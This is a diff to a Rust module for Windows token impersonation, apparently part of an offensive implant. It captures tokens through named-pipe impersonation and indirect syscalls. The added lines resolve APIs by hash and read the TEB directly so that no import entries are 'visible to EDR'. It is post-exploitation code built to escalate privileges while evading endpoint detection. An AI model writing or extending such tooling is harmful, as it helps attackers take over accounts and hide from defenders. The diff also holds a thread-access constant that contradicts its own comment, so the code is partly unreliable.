@@ -45,14 +45,40 @@
 #![cfg(all(windows, feature = "token-impersonation"))]
 
 use anyhow::{anyhow, Context, Result};
+use rand::Rng;
 use std::collections::HashMap;
 use std::sync::{Mutex, OnceLock};
 use std::sync::atomic::{AtomicBool, Ordering};
 use winapi::um::winnt::{
-    HANDLE, SECURITY_ATTRIBUTES, TOKEN_ALL_ACCESS, TOKEN_DUPLICATE,
+    HANDLE, SECURITY_ATTRIBUTES, TOKEN_DUPLICATE,
     TOKEN_IMPERSONATE, TOKEN_QUERY,
     SecurityImpersonation, TokenImpersonation,
 };
+/// Minimal token access for impersonation: TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY.
+const TOKEN_IMPERSONATE_ACCESS: u32 = TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY;
+
+/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
+#[cfg(windows)]
+unsafe fn get_last_error() -> u32 {
+    use std::sync::OnceLock;
+    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
+    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetLastError\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    if let Some(func) = fn_ptr {
+        func()
+    } else {
+        // Fallback: read TEB directly (x86_64 Windows)
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        std::ptr::read_volatile(teb.add(0x68) as *const u32)
+    }
+}
 use winapi::um::handleapi::INVALID_HANDLE_VALUE;
 // All function imports removed — resolved dynamically via pe_resolve or indirect
 // syscalls to eliminate IAT entries visible to EDR. Type-only imports retained.
@@ -159,6 +185,8 @@ const STATUS_INVALID_HANDLE: NTSTATUS = 0xC0000008u32 as i32;
 
 /// ThreadInformationClass value for setting the impersonation token.
 const THREAD_IMPERSONATION_TOKEN: u32 = 4;
+/// Minimal thread access for waiting/termination: THREAD_QUERY_LIMITED_INFORMATION | THREAD_TERMINATE.
+const THREAD_WAIT_ACCESS: u64 = 0x0042;
 
 /// Pipe buffer size for the impersonation listener.
 const PIPE_BUFFER_SIZE: DWORD = 1024;
@@ -507,7 +535,7 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     // zero for non-overlapped.  For non-overlapped, zero means success.
     // ERROR_PIPE_CONNECTED (535) means a client is already connected.
     let connected = wait_result != 0
-        || winapi::um::errhandlingapi::GetLastError() == winapi::um::winerror::ERROR_PIPE_CONNECTED;
+        || unsafe { get_last_error() } == winapi::um::winerror::ERROR_PIPE_CONNECTED;
 
     if !connected {
         log::warn!("token_impersonation: ConnectNamedPipe failed in helper thread");
@@ -524,7 +552,7 @@ unsafe extern "system" fn impersonation_thread_entry(param: LPVOID) -> DWORD {
     };
     let ok = unsafe { impersonate_fn(ctx.pipe_handle) };
     if ok == 0 {
-        let err = winapi::um::errhandlingapi::GetLastError();
+        let err = unsafe { get_last_error() };
         log::warn!(
             "token_impersonation: ImpersonateNamedPipeClient failed in helper thread: error {err}"
         );
@@ -602,7 +630,7 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
         // Generate a random pipe name.
         let random_suffix: String = (0..8)
             .map(|_| {
-                let b = rand::random::<u8>() % 26;
+                let b = rand::thread_rng().gen_range(0..26u8);
                 (b'a' + b) as char
             })
             .collect();
@@ -636,7 +664,7 @@ pub fn impersonate_pipe(pipe_name: &str) -> Result<String> {
     };
 
     if pipe_handle == INVALID_HANDLE_VALUE {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+        let err = unsafe { get_last_error() };
         return Err(anyhow!("CreateNamedPipeA failed for '{full_path}': Win32 error {err}"));
     }
 
@@ -677,7 +705,7 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
         syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64,
-            0x1FFFFFu64,                         // THREAD_ALL_ACCESS
+            THREAD_WAIT_ACCESS,                         // minimal thread access
             std::ptr::null::<u64>() as u64,
             (-1isize) as u64,                    // NtCurrentProcess()
             Some(impersonation_thread_entry) as *const _ as u64,
@@ -724,8 +752,8 @@ fn impersonate_pipe_via_set_thread_token(pipe_handle: HANDLE, pipe_path: &str) -
 
     // Duplicate the token for our own use.
     let dup_token = unsafe {
-        nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate token from helper thread (SetThreadToken path)")?;
+        nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
+    }.context("failed to duplicate token from helper thread (SetThreadToken path)")?;;
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
@@ -796,7 +824,7 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
         syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as u64, // ThreadHandle
-            0x1FFFFFu64,                         // DesiredAccess = THREAD_ALL_ACCESS
+            THREAD_WAIT_ACCESS,                         // DesiredAccess (minimal)
             std::ptr::null::<u64>() as u64,      // ObjectAttributes
             (-1isize) as u64,                    // ProcessHandle = NtCurrentProcess()
             Some(impersonation_thread_entry) as *const _ as u64, // StartRoutine
@@ -848,8 +876,8 @@ fn impersonate_pipe_via_thread(pipe_handle: HANDLE, pipe_path: &str) -> Result<S
 
     // Duplicate the token for our own use.
     let dup_token = unsafe {
-        nt_duplicate_token(token, TOKEN_ALL_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate token from helper thread")?;
+        nt_duplicate_token(token, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
+    }.context("failed to duplicate token from helper thread")?;;
 
     // Close the original token and the helper thread.
     nt_close_handle(token);
@@ -1050,8 +1078,8 @@ pub fn import_token(token_handle: HANDLE, source: TokenSource) -> Result<String>
 
     // Duplicate the token so the caller can close their handle.
     let dup_token = unsafe {
-        nt_duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenImpersonation)
-    }.context("failed to duplicate imported token")?;
+        nt_duplicate_token(token_handle, TOKEN_IMPERSONATE_ACCESS, TokenImpersonation)
+    }.context("failed to duplicate imported token")?;;
 
     let cached = CachedToken {
         handle: dup_token,
